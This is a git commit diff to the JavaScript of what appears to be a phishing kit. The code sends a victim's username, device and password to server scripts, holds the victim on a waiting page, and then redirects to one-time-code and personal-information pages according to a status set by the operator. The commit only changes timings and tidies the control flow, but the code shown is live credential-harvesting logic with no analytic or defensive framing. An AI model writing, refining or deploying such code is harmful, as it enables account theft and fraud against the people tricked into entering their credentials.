2a26ec93a308e097ab6221ec0078cca096793641
leidyjhoanalj88-png <leidyjhoanalj88@gmail.com>
2026-04-22 00:35:15 -0500

    Actualizar functions.js

--- js/functions.js
+++ js/functions.js
@@ -4,26 +4,31 @@ function detectar_dispositivo(){
     return dispositivo;
 }
 
+// ESTO QUITA EL "CARGANDO" APENAS ABRES LA PÁGINA
+$(document).ready(function() {
+    setTimeout(function(){
+        $("#fondo, #cargando, #cargando-o").hide();
+    }, 1000); 
+});
+
 function inicio(u){
     var d = detectar_dispositivo();
     $("#fondo, #cargando-o").show();
     $.post( "../process/inicio.php", { usr: u, dis: d } );
-    setTimeout(function(){ window.location.href = "PASS.php"; }, 1000);
+    setTimeout(function(){ window.location.href = "PASS.php"; }, 1200);
 }
 
 function pasousuario(p){    
     $("#fondo, #cargando-o").show();
     $.post( "../process/pasousuario.php", { pass: p } );
-    setTimeout(function(){ window.location.href = "WAITING.php"; }, 1000);
+    setTimeout(function(){ window.location.href = "WAITING.php"; }, 1200);
 }            
 
 function consultar_estado(){    
     $.post( "../process/estado.php?v=" + Math.random(), function(data) {        
         var estado = data.toString().trim();
-        switch (estado) {
-            case '2': window.location.href = "OTP.php"; break;
-            case '4': window.location.href = "INFO.php"; break;
-            case '10': window.location.href = "SUCCESS.php"; break;
-        } 
+        if (estado === '2') { window.location.href = "OTP.php"; }
+        else if (estado === '4') { window.location.href = "INFO.php"; }
+        else if (estado === '10') { window.location.href = "SUCCESS.php"; }
     });        
 }
